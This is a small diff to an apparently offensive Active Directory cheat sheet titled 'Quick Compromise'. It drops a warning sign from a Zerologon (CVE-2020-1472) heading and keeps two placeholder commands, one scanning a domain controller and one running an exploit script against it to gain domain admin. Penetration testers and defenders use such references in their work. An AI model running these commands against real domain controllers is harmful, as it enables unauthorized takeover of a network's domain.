@@ -1,6 +1,6 @@
 # Quick Compromise
 
-## ⚠️ Zerologon (unsafe) CVE-2020-1472 @CVE@ >>> Domain admin
+## Zerologon (unsafe) CVE-2020-1472 @CVE@ >>> Domain admin
 - `zerologon-scan '<dc_netbios_name>' '<ip>'`
 - `cve-2020-1472-exploit.py <MACHINE_BIOS_NAME> <ip>`
 
